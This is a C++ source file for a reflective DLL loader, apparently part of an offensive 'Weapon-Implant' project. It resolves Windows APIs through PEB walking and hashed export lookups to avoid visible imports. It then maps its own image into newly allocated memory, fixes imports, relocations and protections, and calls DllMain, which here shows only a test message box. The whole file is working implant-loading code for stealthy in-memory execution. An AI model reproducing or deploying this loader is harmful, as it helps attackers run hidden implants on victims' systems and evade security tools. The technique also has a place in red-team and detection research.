#include "../include/Dllmain.hpp"

CREATEHASHA(GetProcAddress);
CREATEHASHA(LoadLibraryA);
CREATEHASHA(VirtualAlloc);
CREATEHASHA(VirtualProtect);
CREATEHASHA(NtFlushInstructionCache);
CREATEHASHW(KERNEL32);
CREATEHASHW(ntdll);


//////////////////////////////////////////////////////////////////////////////////////////////////////////////
// All functions here should be marked as __forceinline or inline at the bare minimum.
// Additionally, optimization should be set to /O2, and inline function expansion should
// be set to /Ob2. This will allow the compiler to write the code in a position independant manner without
// us needing to do it ourselves. All function calls should be expanded inline at their callsites, preventing
// the need for the function's address to be resolved. If a crash occurs at load time, it's because the 
// compiler decided to not honor our requests.
//


__forceinline byte* GetModuleHandleH(u32 ModuleHash) {

    PPEB pPeb = (PPEB)__readgsqword(0x60);

    PLDR_DATA_TABLE_ENTRY pDataEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pPeb->Ldr->InMemoryOrderModuleList.Flink);
    PLIST_ENTRY pListHead = reinterpret_cast<PLIST_ENTRY>(&(pPeb->Ldr->InMemoryOrderModuleList));
    PLIST_ENTRY pItr = reinterpret_cast<PLIST_ENTRY>(pListHead->Flink);


    do {

        if (pDataEntry->FullDllName.Length) {

            if (JenkinsHash(NULL, pDataEntry->FullDllName.Buffer) == ModuleHash) {
                return static_cast<byte*>(pDataEntry->Reserved2[0]);
                break;
            }
        }

        pDataEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pItr->Flink);
        pItr = (PLIST_ENTRY)(pItr->Flink);


    } while (pItr != pListHead);

    return nullptr;
}



__forceinline void* GetProcAddressH(HMODULE ModuleBase, u32 FunctionHash) {

    byte* Base = reinterpret_cast<byte*>(ModuleBase);

    PIMAGE_NT_HEADERS pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(Base + ((PIMAGE_DOS_HEADER)Base)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return nullptr;


    PIMAGE_EXPORT_DIRECTORY pImgExportDirectory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY> \
        (Base + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);


    u32* Names = reinterpret_cast<u32*>(Base + pImgExportDirectory->AddressOfNames);
    u32* Addresses = reinterpret_cast<u32*>(Base + pImgExportDirectory->AddressOfFunctions);
    u16* Ordinals = reinterpret_cast<u16*>(Base + pImgExportDirectory->AddressOfNameOrdinals);


    for (size_t i = 0; i < pImgExportDirectory->NumberOfFunctions; i++) {

        char* Name = (char*)(Base + Names[i]);
        void* Address = (void*)(Base + Addresses[Ordinals[i]]);

        if (JenkinsHash(Name, NULL) == FunctionHash)
            return Address;
    }

    return nullptr;
}



__forceinline bool HandleRelocations(PE_INFO* pPeInfo) {

    if (pPeInfo->InitComplete == false || pPeInfo->pMappedData == nullptr)
        return false;


    //
    // Each Image base relocation struct describes a singular section.
    //

    PIMAGE_BASE_RELOCATION pImgBaseRelocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>\
        (pPeInfo->pMappedData + (pPeInfo->pEntryBaseRelocDataDir->VirtualAddress));

    u64 DeltaOffset = static_cast<u64>\
        ( ((u64)(pPeInfo->pMappedData)) - (pPeInfo->pImgNtHdrs->OptionalHeader.ImageBase) );


    PBASE_RELOCATION_ENTRY pRelocationEntry = nullptr;



    //
    // Iterate through all sections that must be adjusted,
    // as well as each relocation entry within these sections.
    //
    
    while (pImgBaseRelocation->VirtualAddress) {

        pRelocationEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

        while ((byte*)pRelocationEntry != (byte*)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock) {


            //
            // Each relocation entry field must be adjusted depending on it's Type member.
            //

            switch (pRelocationEntry->Type) {

                case IMAGE_REL_BASED_DIR64:
                    *((u64*)(pPeInfo->pMappedData + (pImgBaseRelocation->VirtualAddress + pRelocationEntry->Offset))) += DeltaOffset;
                    break;

                case IMAGE_REL_BASED_HIGHLOW:
                    *((u32*)(pPeInfo->pMappedData + (pImgBaseRelocation->VirtualAddress + pRelocationEntry->Offset))) += (u32)DeltaOffset;
                    break;

                case IMAGE_REL_BASED_HIGH:
                    *((u16*)(pPeInfo->pMappedData + (pImgBaseRelocation->VirtualAddress + pRelocationEntry->Offset))) += HIWORD(DeltaOffset);
                    break;

                case IMAGE_REL_BASED_LOW:
                    *((u16*)(pPeInfo->pMappedData + (pImgBaseRelocation->VirtualAddress + pRelocationEntry->Offset))) += LOWORD(DeltaOffset);
                    break;

                case IMAGE_REL_BASED_ABSOLUTE:
                    break;

                default:
                    break;
                }

            pRelocationEntry++;
        }

        pImgBaseRelocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(pRelocationEntry);
    }

    return true;
}



__forceinline bool ResolveMemoryProtections(PE_INFO* pPeInfo) {

    if (pPeInfo->InitComplete == false || pPeInfo->pMappedData == nullptr)
        return false;

    PIMAGE_SECTION_HEADER pImgSectionHdr = pPeInfo->pImgSecHdr;



    for (size_t i = 0; i < pPeInfo->pImgNtHdrs->FileHeader.NumberOfSections; i++) {

        if (!pImgSectionHdr[i].VirtualAddress || !pImgSectionHdr[i].SizeOfRawData)
            continue;


        fnVirtualProtect pVirtualProtect = static_cast<fnVirtualProtect>\
            (GetProcAddressH((HMODULE)GetModuleHandleH(KERNEL32_compHashedW), VirtualProtect_compHashedA));
        
        u32 NewProtect = 0;
        u32 OldProtect = 0;
    


        //
        // Compare the bitmask in each section header against existing values
        // to determine the correct memory permissions
        //

        if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            NewProtect = PAGE_WRITECOPY;
        }

        if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ) {
            
            NewProtect = PAGE_READONLY;
        }

        if ((pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && 
            (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ)) {
            
            NewProtect = PAGE_READWRITE;
        }

        if (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            
            NewProtect = PAGE_EXECUTE;
        }

        if ((pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && 
            (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
            
            NewProtect = PAGE_EXECUTE_WRITECOPY;
        }

        if ((pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && 
            (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ)) {
            
            NewProtect = PAGE_EXECUTE_READ;
        }

        if ((pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && 
            (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && 
            (pImgSectionHdr[i].Characteristics & IMAGE_SCN_MEM_READ)) {
            
            NewProtect = PAGE_EXECUTE_READWRITE;
        }


        //
        // Apply the new memory protection
        //

        if (!pVirtualProtect(
            (LPVOID)(pPeInfo->pMappedData + (pImgSectionHdr[i].VirtualAddress)),
            pImgSectionHdr[i].SizeOfRawData,
            NewProtect,
            &OldProtect )) {

            return false;
        }
    }

    return true;
}



__forceinline bool RelocateSections(PE_INFO* pPeInfo, byte* RawDataBase) {


    fnVirtualAlloc pVirtualAlloc = static_cast<fnVirtualAlloc>\
        (GetProcAddressH((HMODULE)GetModuleHandleH(KERNEL32_compHashedW), VirtualAlloc_compHashedA));
    
    if (!pPeInfo->InitComplete || pVirtualAlloc == nullptr)
        return false;


    pPeInfo->pMappedData = static_cast<byte*>(pVirtualAlloc(
        nullptr,
        pPeInfo->ImageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE));

    if (pPeInfo->pMappedData == nullptr)
        return false;



    //
    // Iterate through each image section and copy it to its virtual address.
    //

    for (size_t i = 0; i < pPeInfo->pImgNtHdrs->FileHeader.NumberOfSections; i++) {

        _memcpy(
            (void*)(pPeInfo->pMappedData + pPeInfo->pImgSecHdr[i].VirtualAddress),
            (void*)(RawDataBase + pPeInfo->pImgSecHdr[i].PointerToRawData),
            pPeInfo->pImgSecHdr[i].SizeOfRawData
        );
    }

    return true;
}



__forceinline bool ResolveImports(PE_INFO* pPeInfo) {

    if (pPeInfo->InitComplete == false || pPeInfo->pMappedData == nullptr)
        return false;

    PIMAGE_IMPORT_DESCRIPTOR pImgImportDescriptor = nullptr;



    //
    // Iterate Through Each Import Descriptor. Each one
    // Corresponds to a DLL.
    //

    for (size_t i = 0; i < pPeInfo->pEntryImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

        pImgImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>\
            (pPeInfo->pMappedData + (pPeInfo->pEntryImportDataDir->VirtualAddress + i));



        //
        // NULL thunks indicate the end of the import descriptors
        //

        if (pImgImportDescriptor->FirstThunk == NULL &&
            pImgImportDescriptor->OriginalFirstThunk == NULL) {

            break;
        }



        //
        // Locate LoadLibraryA so we can load modules into memory
        //

        fnLoadLibraryA pLoadLibraryA = static_cast<fnLoadLibraryA>\
            (GetProcAddressH((HMODULE)GetModuleHandleH(KERNEL32_compHashedW), LoadLibraryA_compHashedA));

        if (pLoadLibraryA == nullptr)
            return false;



        //
        // Resolve all imports from the DLL
        //

        char* ModuleName = reinterpret_cast<char*>(pPeInfo->pMappedData + (pImgImportDescriptor->Name));
        u64 NameTableOffset = static_cast<u64>(pImgImportDescriptor->OriginalFirstThunk);
        u64 AddressTableOffset = static_cast<u64>(pImgImportDescriptor->FirstThunk);
        size_t ThunkArrayIndexOffset = 0; //Determines position inside of thunk array

        HMODULE ModuleBase = pLoadLibraryA(ModuleName);
        if (ModuleBase == nullptr)
            return false;


        
        while (true) {


            PIMAGE_THUNK_DATA pOriginalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA>\
                (pPeInfo->pMappedData + (NameTableOffset + ThunkArrayIndexOffset));

            PIMAGE_THUNK_DATA pFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA>\
                (pPeInfo->pMappedData + (AddressTableOffset + ThunkArrayIndexOffset));


            PIMAGE_IMPORT_BY_NAME pImgImportByName = nullptr; //Used when import is not done via Ordinal
            u64 FunctionAddress = 0x00;
            
            

            //
            // Null thunks indicate the end of the array.
            //

            if (pOriginalFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL)
                break;


            if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)) {


                //
                // If function is imported by ordinal we need to manually determine it ourselves.
                //

                PIMAGE_NT_HEADERS TempImageNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>\
                    ((u64)ModuleBase + ((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew);

                if (TempImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
                    break;
            
                
                PIMAGE_EXPORT_DIRECTORY TempImageExportDirectory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>\
                    ( ((u64)ModuleBase) + (TempImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) );
                
                
                u32* TempAddressArray = reinterpret_cast<u32*>\
                    ( ((u64)ModuleBase) + (TempImageExportDirectory->AddressOfFunctions) );

                FunctionAddress = (u64)( ((u64)ModuleBase) + (TempAddressArray[pOriginalFirstThunk->u1.Ordinal]) );
            }


            else {

                //
                // Function is imported by name.
                //

                pImgImportByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>\
                    (pPeInfo->pMappedData + (pOriginalFirstThunk->u1.AddressOfData));

                FunctionAddress = (u64)GetProcAddressH(ModuleBase, JenkinsHash(pImgImportByName->Name, NULL));
            }



            //
            // Resolve function address via Import Address Table
            //

            if (!FunctionAddress)
                return false;

            pFirstThunk->u1.Function = (ULONGLONG)FunctionAddress;
            ThunkArrayIndexOffset += sizeof(IMAGE_THUNK_DATA);
        }
    }

    return true;
}



__forceinline void* GetEntryPoint(PE_INFO* pPeInfo) {

    if (pPeInfo->InitComplete == false || pPeInfo->pMappedData == nullptr)
        return nullptr;

    return (void*)(pPeInfo->pMappedData + (pPeInfo->pImgNtHdrs->OptionalHeader.AddressOfEntryPoint));
}



__forceinline bool InitializeImageInformation(byte* ModuleBase, PE_INFO* pPeInfo) {

    if ( ((PIMAGE_DOS_HEADER)ModuleBase)->e_magic != IMAGE_DOS_SIGNATURE)
        return false;


    pPeInfo->pImgNtHdrs = (PIMAGE_NT_HEADERS)(ModuleBase + (((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew) );
    if (pPeInfo->pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return false;


    pPeInfo->ImageSize = pPeInfo->pImgNtHdrs->OptionalHeader.SizeOfImage;
    pPeInfo->pImgSecHdr = (PIMAGE_SECTION_HEADER)(IMAGE_FIRST_SECTION(pPeInfo->pImgNtHdrs));

    pPeInfo->pEntryBaseRelocDataDir = (PIMAGE_DATA_DIRECTORY)(&(pPeInfo->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]));
    pPeInfo->pEntryExceptionDataDir = (PIMAGE_DATA_DIRECTORY)(&(pPeInfo->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]));
    pPeInfo->pEntryExportDataDir = (PIMAGE_DATA_DIRECTORY)(&(pPeInfo->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]));
    pPeInfo->pEntryImportDataDir = (PIMAGE_DATA_DIRECTORY)(&(pPeInfo->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]));
    pPeInfo->pEntryTLSDataDir = (PIMAGE_DATA_DIRECTORY)(&(pPeInfo->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]));

    pPeInfo->InitComplete = true;
    return true;
}




extern __declspec(dllexport) bool ReflectiveStub() {


    //
    // BruteForce Module Base
    //

    u64 TempAddress = (u64)ReflectiveStub;
    byte* ModuleBase = nullptr;

    while (true) {

        PIMAGE_DOS_HEADER TempDosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>(TempAddress);
        
        if ( TempDosHdr->e_magic == IMAGE_DOS_SIGNATURE) {

            PIMAGE_NT_HEADERS pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(TempAddress + TempDosHdr->e_lfanew);
            if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE) {
                ModuleBase = (byte*)TempAddress;
                break;
            }
        }

        TempAddress--;
    }

    if (ModuleBase == nullptr)
        return false;



    //
    // Perform initial reflective setup
    //

    PE_INFO ImageInfo = { 0 };
    
    if (!InitializeImageInformation(ModuleBase, &ImageInfo))
        return false;

    if (!RelocateSections(&ImageInfo, ModuleBase))
        return false;

    if (!ResolveImports(&ImageInfo))
        return false;

    if (!HandleRelocations(&ImageInfo))
        return false;

    if (!ResolveMemoryProtections(&ImageInfo))
        return false;



    //
    // Flush process instruction cache
    //

    fnNtFlushInstructionCache pNtFlushInstructionCache = static_cast<fnNtFlushInstructionCache>\
        (GetProcAddressH((HMODULE)GetModuleHandleH(ntdll_compHashedW), NtFlushInstructionCache_compHashedA));

    fnDllMain pDllMain = static_cast<fnDllMain>(GetEntryPoint(&ImageInfo));

    if (pDllMain == nullptr || pNtFlushInstructionCache == nullptr)
        return false;

    
    pNtFlushInstructionCache((HANDLE)-1, nullptr, 0x00);



    //
    // Call DllMain
    //

    pDllMain((HMODULE)(ImageInfo.pMappedData), DLL_PROCESS_ATTACH, ModuleBase);
    return true;
}



void TestFunctionAlertCompletion() {
    MessageBoxA(NULL, "Hello From Reflective DLL!", "Weapon-Implant", MB_OK); // Test to show that the load was successful
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
            
        TestFunctionAlertCompletion();
        break;

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

